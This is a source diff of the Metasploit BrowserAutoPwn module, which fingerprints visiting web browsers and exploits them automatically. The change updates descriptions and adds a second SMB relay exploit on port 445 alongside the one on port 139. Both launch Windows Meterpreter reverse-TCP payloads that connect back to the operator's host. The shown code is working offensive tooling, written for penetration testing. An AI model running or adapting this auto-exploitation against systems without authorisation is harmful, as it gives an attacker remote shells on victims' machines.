@@ -22,14 +22,16 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 	
 	def initialize(info = {})
 		super(update_info(info, 
-			'Name'        => 'HTTP Client fingerprinter and autoexploiter',
+			'Name'        => 'HTTP Client Automatic Exploiter',
 			'Version'     => '$Revision: $',
 			'Description' => %q{
-				Webbrowser fingerprinter and autoexploiter. 
+					This module uses a combination of client-side and server-side techniques to
+				fingerprint HTTP clients and then automatically exploit them.
 				},
-			'Author'      => [
-					'egypt <egypt@nmt.edu>',  # initial concept, integration and extension of Jerome's os_detect.js
-					'Jerome Athias' # advanced Windows OS detection in javascript
+			'Author'      => 
+				[
+					'egypt <egypt[at]nmt.edu>',  # initial concept, integration and extension of Jerome's os_detect.js
+					'Jerome Athias'              # advanced Windows OS detection in javascript
 				],
 			'License'     => BSD_LICENSE,
 			'Actions'     =>
@@ -43,12 +45,13 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
-			OptAddress.new('LHOST', [true, 'Your local IP address ror reverse payloads']),
-			OptPort.new('LPORT', [false, 'For reverse payloads; incremented for each exploit', 4444])
-			])
+			OptAddress.new('LHOST', [true, 'The IP address to use for reverse-connect payloads']),
+			OptPort.new('LPORT', [false, 'The starting TCP port number for reverse-connect payloads', 4444])
+		], self.class)
 
 		@exploits = Hash.new
 	end
+	
 	def init_exploit(name, targ = 0)
 		targ ||= 0
 		case name
@@ -144,17 +147,36 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 
 		#init_exploit('exploit/windows/browser/winamp_playlist_unc')
 
-		# requires UNC path which only seems to work on IE in my tests
+
+		#
+		# Requires UNC path which only seems to work on IE in my tests
+		#
+		
+		# Launch a smb_relay module on port 139
 		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
-			
 		smbr_mod.datastore['LHOST']   = @lhost
-		smbr_mod.datastore['LPORT']   = @lport
+		smbr_mod.datastore['LPORT']   = (@lport += 1)
+		smbr_mod.datastore['SRVPORT'] = 139
 		smbr_mod.exploit_simple(
 			'LocalInput'     => self.user_input,
 			'LocalOutput'    => self.user_output,
 			'Target'         => 0,
 			'Payload'        => 'windows/meterpreter/reverse_tcp',
 			'RunAsJob'       => true)
+
+		# Launch a second one with port 445
+		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
+		smbr_mod.datastore['LHOST']   = @lhost
+		smbr_mod.datastore['LPORT']   = (@lport += 1)
+		smbr_mod.datastore['SRVPORT'] = 445
+		smbr_mod.exploit_simple(
+			'LocalInput'     => self.user_input,
+			'LocalOutput'    => self.user_output,
+			'Target'         => 0,
+			'Payload'        => 'windows/meterpreter/reverse_tcp',
+			'RunAsJob'       => true)
+			
+						
 	end
 
 	def on_request_uri(cli, request) 
@@ -241,6 +263,10 @@ class Auxiliary::Server::BrowserAutoPwn < Msf::Auxiliary
 			'{0006F03A-0000-0000-C000-000000000046}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
 		}
 		hash_declaration = objects.map{ |k, v| "'#{k}', '#{v}'," }.join.chop
+
+
+		
+
 
 		js = <<-ENDJS
 
